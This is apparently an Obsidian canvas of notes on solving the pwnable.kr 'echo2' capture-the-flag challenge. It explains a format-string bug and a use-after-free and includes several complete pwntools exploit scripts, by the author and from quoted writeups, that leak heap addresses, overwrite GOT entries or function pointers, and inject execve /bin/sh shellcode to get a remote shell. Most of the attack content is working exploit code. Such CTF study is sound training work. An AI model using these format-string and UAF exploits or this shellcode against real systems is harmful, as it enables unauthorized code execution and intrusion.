{
	"nodes":[
		{"id":"d814b1d995de7d6e","type":"text","text":"# overwrite `o`\nwhen getting the malloced object you get the freed `o` object which you can overwrite 32 bytes of it :).","x":-1220,"y":900,"width":635,"height":333},
		{"id":"3612cca6b51566e3","type":"text","text":"# understanding the challenge\n\nthis time we have FSB and UAF on port 9011 :)\n\n## echo2\nwe get an input with `fgets` (no BOF). And then we print it as a format :)\nmoreover the format is on the stack so we have a primitive write to any address.\nmore obviously we can leak values from a given address :)  \n### echo3\nwe malloc an object of size 32, Then we input to it 32 bytes then we puts it & free it.\n\nIn both functions we have the `greetings` and `byebye` calls\n\n### hints\n```bash\n[*] '/mnt/c/Users/reemp/Desktop/not-giving-a-fuck/echo2/echo2'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX unknown - GNU_STACK missing\n    PIE:      No PIE (0x400000)\n    Stack:    Executable\n    RWX:      Has RWX segments\n```\nwe can execute on the stack, heap, bss.","x":-720,"y":-300,"width":980,"height":980},
		{"id":"9331a6192f3a4c4f","type":"text","text":"# write primitive \n\ninteresting addresses\n* the global o pointer\n* the GOT\n","x":1240,"y":190,"width":640,"height":518},
		{"id":"a2b1cd47b43dc835","type":"text","text":"# overwriting the GOT\n\n* change `puts` to run any function a simple code redirection\n* change `printf`  to `system` and input `/bin/sh`","x":1180,"y":888,"width":760,"height":360},
		{"id":"476d3d4edf53268e","type":"text","text":"# memory leak\nI could leak \n* o's value (heap address)\n* stack addresses","x":440,"y":592,"width":480,"height":296,"color":"4"},
		{"id":"185f7c09969e1e4e","type":"text","text":"# code execution\nby overwriting `byebye` after we finish echo3 we will run `byebye(o)` \n* I could change `byebye` to be `o` using the memory leak . and store inside `o` the shellcode.","x":-1024,"y":1484,"width":604,"height":356,"color":"4"},
		{"id":"bb19f294cf20b72c","type":"text","text":"# implementation\n\n1. leak o's value.\n    ```\n    %7$lx   AAAAAAAA\n    4141414141414141   AAAAAAAA\n    ```\n1. free o\n2. inject the `shellcode` and overwrite `byebye` to point to the `shellcode`\n    we can't overwrite `byebye` but we can overwrite `greetings` 24 bytes shellcode and then 8 bytes the new address of greetings. (which will point to the leak address).\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\nO_ADDRESS = 0x602098\n# 24 bytes shellcode\nshellcode = b'\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\\x90'\n\np = gdb.debug('./echo2', gdbscript='b *0x4008D8')\n# p = process('./echo2')\n\np.sendlineafter(b'hey, what\\'s your name? :', b':)')\n# FSB\np.sendlineafter(b'> ', b'2')\np.sendlineafter(b'hello :)\\n', b'[%7$s]  ' + p64(O_ADDRESS))\n\no_value = unpack(p.recvregex(br'(?<=\\[)(.*?)(?=\\])', capture=True).group(), word_size=32, endian='little')\n\nlog.success('leaked address {0:x}'.format(o_value))\n\n# UAF\np.sendlineafter(b'> ', b'4')\np.sendlineafter(b'exit? (y/n)', b'n')\np.sendlineafter(b'> ', b'3')\n\np.recvline() # hello garbage\np.sendline(shellcode + p64(o_value))\n\n# free coruppted our shellcode :(\n# triger greetings\np.sendlineafter(b'> ', b'2')\np.interactive()\n```\n## problem\n![[Pasted image 20231123121923.png]]\nafter the `free` the shellcode get's corrupted...\n![[Pasted image 20231123122055.png]]\n\n### solutions\n* I can change the GOT of free to the start of the shellcode (`o_value`)\n* I can store the shellcode at `o_value + 8`, and using a FSB write `o_value + 8` to o_value+0x20 (`byebye`) the problem is that when we call greetings in echo2 it will crash...\n* use another memory location! the stack maybe ???","x":80,"y":1440,"width":1340,"height":2120},
		{"id":"da862469c5f17f4c","type":"text","text":"# simplification\n* store inside name the shellcode\n* leak the value of `o`\n* overwrite the `got.printf` to that value.\n\n## problem\nthe shellcode doesn't run on the remote machine :(\n\nchange the overwrite to malloc and it worked like a charm :)\n\n```python\nfrom pwn import *\ncontext.log_level = 'info'\n\nO_ADDRESS = 0x602098\n# 24 bytes shellcode\nshellcode = b'\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\\x90'\n\n  \n\ndef pad_16(data):\n    if 16 - len(data) < 0:\n        log.error('data {0} is bigger then 16 bytes'.format(data))\n    return data + b' '*(16 - len(data))\n\n# p = gdb.debug('./echo2', gdbscript='b *0x400869')\n# p = process('./echo2')\np = remote('pwnable.kr', 9011)\nelf = ELF('./echo2')\np.sendlineafter(b'hey, what\\'s your name? :', shellcode)\n  \n\n# FSB\np.sendlineafter(b'> ', b'2')\np.recvline()\np.sendline(b'[%7$s]  ' + p64(O_ADDRESS))\no_value = u64(p.recvregex(br'(?<=\\[)(.*?)(?=\\])', capture=True).group().ljust(8, b'\\x00'))\nlog.success('leaked address {0:x}'.format(o_value))\n\n# overwrite the GOT\np.sendlineafter(b'> ', b'2')\npayload = pad_16(b'%{0}x%8$ln'.format(o_value))\npayload += p64(elf.got['malloc'])\n\np.sendlineafter(b'\\n', payload)  \n\np.interactive()\n```","x":-40,"y":3840,"width":1500,"height":2200},
		{"id":"f91dcf9d9dd9ceb4","x":-840,"y":2580,"width":458,"height":480,"color":"4","type":"text","text":"# `ihciah` writeup\n\nI could really use the same idea but to leak the **stack address** of name. Then overwrite greetings using the UAF and trigger it, to call name :).\n\nto leak &name I only need a stack address and then to subtract from it the distance :)"},
		{"id":"e8c399d20aed3dad","x":-1360,"y":3120,"width":1020,"height":980,"type":"text","text":"# `shmctl` writeup\n\n```python\nfrom pwn import *\n\ncon = remote(\"pwnable.kr\", 9011)\nshellcode = b\"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\"\ncon.sendlineafter(\":\", \"shahak\")\n\ncon.sendlineafter(\">\", \"2\")\ncon.sendline(\"%4$p\")\ncon.recvline()\nheap_address = int(con.recvline(), 16)\nheap_address -= (heap_address % 16)\n\ncon.sendlineafter(\">\", \"4\")\ncon.sendlineafter(\")\", \"n\")\n\ncon.sendlineafter(\">\", \"3\")\nexploit = shellcode + (b\"A\" * (24 - len(shellcode))) + p64(heap_address)\ncon.sendline(exploit)\ncon.interactive()\n```\n\nremotely you could easily leak the `o_value`.  Then overwriting o content with the `shellcode` and then change greetings to point to the `shellcode` . the problem is that `o` is freed and "},
		{"id":"cd96b3475dbc4d26","x":-1860,"y":5000,"width":1280,"height":2560,"type":"text","text":"# `deeplow` writeup\n```python\n'''\nNo UAF, FSB and NX\n'''\n\nfrom pwn import *\nimport sys\n\nbinary = './echo2'\n\ncontext.log_level = 'ERROR'\ncontext.binary = binary\n\nelf = ELF(binary)\n\nio = remote('pwnable.kr', 9011)\n\no_addr = elf.symbols['o']\nputs_got = elf.got['puts']\nfree_got = elf.got['free']\nmalloc_got = elf.got['malloc']\n\n# leak address using FSB\ndef leak_addr(addr):\n    format_string = \"%7$s\"\n    format_string += \"\\xde\\xad\\xbe\\xef\" + p64(addr)\n    io.sendlineafter(\"> \", \"2\")\n    io.sendline(format_string)\n\n    io.recvline()\n    leak = io.recvuntil(\"\\xde\\xad\\xbe\\xef\")[:-4]\n    leak = leak + \"\\x00\" * (8 - len(leak))\n    la = u64(\"\".join(leak))\n\n    return la\n\n# write byte (val) in memory at addr using FSB\ndef write_byte(addr, val):\n    format_string = \"\"\n    if val != 0:\n        format_string = \"%\" + str(val) + \"c\"\n    format_string += \"%8$n\"\n    format_string += \" \" * (16 - len(format_string))\n    format_string += p64(addr)\n\n    io.sendlineafter(\"> \", \"2\")\n    io.sendline(format_string)\n\n# write an address (val - 8 bytes) in memory at addr using FSB\ndef write_addr(addr, val):\n    vals = [ord(x) for x in list(p64(val))]\n    # don't write all the bytes, the most significant will be 0\n    for i in range(6):\n        print \"Writing {} at address {}\".format(hex(vals[i]), hex(addr + i))\n        write_byte(addr + i, vals[i])\n\nshellcode = \"\\x50\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x54\\x5f\\xb0\\x3b\\x0f\\x05\"\n\n# send shellcode as name\nio.sendline(shellcode)\n\nheap_leak = leak_addr(o_addr)\nprint (\"Heap address (o): \" + hex(heap_leak))\n\nprint (\"Malloc got address: \" + hex(malloc_got))\n# overwrite malloc@got with the start of the heap buffer (where the shellcode is)\nwrite_addr(malloc_got, heap_leak)\n\n# call echo3 where malloc is called\nio.sendlineafter(\"> \", \"3\")\n\nio.interactive()\n```\n\nI could have use `symbol['o']` and write helper functions to write an address."},
		{"id":"e3abfc12221340f7","x":1636,"y":1616,"width":464,"height":344,"type":"text","text":"# `M4x` writeup\n1. leak `libc` base\n2. overwrite `free@GOT` to system\n3. then enter `/bin/sh` in the UAF"},
		{"id":"be81c8b79173edd0","type":"text","text":"# gdb\n\n```\nb *0x4008D8 - echo3 free\nb *0x400869 - echo2 after printf\n```","x":-1495,"y":2120,"width":550,"height":302}
	],
	"edges":[
		{"id":"9ee174ac76a6a973","fromNode":"3612cca6b51566e3","fromSide":"right","toNode":"9331a6192f3a4c4f","toSide":"left"},
		{"id":"0fbf31c0a776f80e","fromNode":"9331a6192f3a4c4f","fromSide":"bottom","toNode":"a2b1cd47b43dc835","toSide":"top"},
		{"id":"4eef827bdf625599","fromNode":"3612cca6b51566e3","fromSide":"left","toNode":"d814b1d995de7d6e","toSide":"top"},
		{"id":"7ad139fbca15cfa0","fromNode":"3612cca6b51566e3","fromSide":"right","toNode":"476d3d4edf53268e","toSide":"top"},
		{"id":"41894a5c997fe846","fromNode":"d814b1d995de7d6e","fromSide":"bottom","toNode":"185f7c09969e1e4e","toSide":"top"},
		{"id":"3f1864f5d428d93e","fromNode":"476d3d4edf53268e","fromSide":"bottom","toNode":"185f7c09969e1e4e","toSide":"right"},
		{"id":"1138672e8a784de6","fromNode":"bb19f294cf20b72c","fromSide":"bottom","toNode":"da862469c5f17f4c","toSide":"top"},
		{"id":"00266fc596cb0892","fromNode":"bb19f294cf20b72c","fromSide":"left","toNode":"f91dcf9d9dd9ceb4","toSide":"right"},
		{"id":"17dac00f836548f9","fromNode":"bb19f294cf20b72c","fromSide":"left","toNode":"e8c399d20aed3dad","toSide":"right"},
		{"id":"f961e0443a721fa2","fromNode":"da862469c5f17f4c","fromSide":"left","toNode":"cd96b3475dbc4d26","toSide":"right"},
		{"id":"0fd015f0d62c2da1","fromNode":"a2b1cd47b43dc835","fromSide":"bottom","toNode":"e3abfc12221340f7","toSide":"top"},
		{"id":"70a9fe3c40dc5fcf","fromNode":"185f7c09969e1e4e","fromSide":"bottom","toNode":"f91dcf9d9dd9ceb4","toSide":"top"}
	]
}